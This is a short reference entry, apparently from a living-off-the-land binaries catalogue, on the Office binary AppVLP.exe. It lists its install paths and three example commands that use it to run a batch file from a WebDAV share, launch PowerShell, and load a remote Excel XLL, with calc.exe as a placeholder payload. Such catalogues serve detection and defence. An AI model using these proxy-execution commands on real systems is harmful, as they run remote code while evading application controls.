## Appvlp.exe
* Functions: Execute
```

AppVLP.exe \\webdav\calc.bat
Executes calc.bat through AppVLP.exe

AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe','', '', 'open', 1)"
Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.

AppVLP.exe powershell.exe -c "$e=New-Object -ComObject excel.application;$e.RegisterXLL('\\webdav\xll_poc.xll')"
Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.
```
   
* Resources:   
  * https://github.com/MoooKitty/Code-Execution
  * https://twitter.com/moo_hax/status/892388990686347264
   
* Full path:   
  * C:\Program Files\Microsoft Office\root\client\appvlp.exe
  * C:\Program Files (x86)\Microsoft Office\root\client\appvlp.exe
   
* Notes: Thanks to fab - @0rbz_ (No record), Will - @moo_hax (Code Execution)  
   
